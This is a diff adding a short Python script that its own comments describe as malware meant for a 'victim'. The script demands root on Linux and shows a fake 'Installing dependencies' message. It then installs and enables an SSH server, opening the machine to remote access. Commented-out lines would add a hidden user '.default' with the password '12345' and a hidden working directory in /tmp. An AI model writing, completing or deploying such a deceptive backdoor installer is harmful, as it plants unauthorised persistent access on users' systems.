@@ -1,0 +1,53 @@
+#!/usr/bin/env python3
+
+import os
+import time
+
+# ||0@#@         .O0O0.       .O0O0.         X         A
+# ||    X       0      O     0      O       X  X      Z Q
+# ||     @      O      0     O      0      X    F    F   A
+# ||      @     0      O     0      O     F      B  X     K
+# ||      @     O      0     0      0    X       X X       K
+# ||     O       .O0O0.       .0O0O.    M         X         Z
+# ||#@@@"
+
+if os.name != "posix":
+    exit()
+
+
+def is_user_root():  # _Asking_Victim_To_Run_As_Root_User!
+    if os.geteuid() == 0:
+        print("Installing dependencies")
+    else:
+        print("Run as root")
+        exit()
+
+
+is_user_root()
+
+current_user = os.getlogin()
+current_dir = os.getcwd()
+mal_file = "(%$cr1pt%!).py"  # _NAME_OF_THE_SCRIPT_MUST_GO_HERE_!!!
+
+
+def shell_commands():
+    os.system("neofetch")
+    time.sleep(0.5)
+    os.system("sudo apt install -y openssh-server")
+    time.sleep(0.1)
+    os.system("sudo systemctl enable ssh.service")
+    # os.system("clear")
+    time.sleep(0.1)
+    # os.system("sudo useradd -m -p '12345' .default")
+    time.sleep(0.1)
+
+
+shell_commands()
+
+
+def hq():  # _Setting_Up_A_Location_To_Work_From
+    os.mkdir("/tmp/aj3cf45mt4ylf2rm378qs120x")
+
+# hq()
+
+# passwd .default
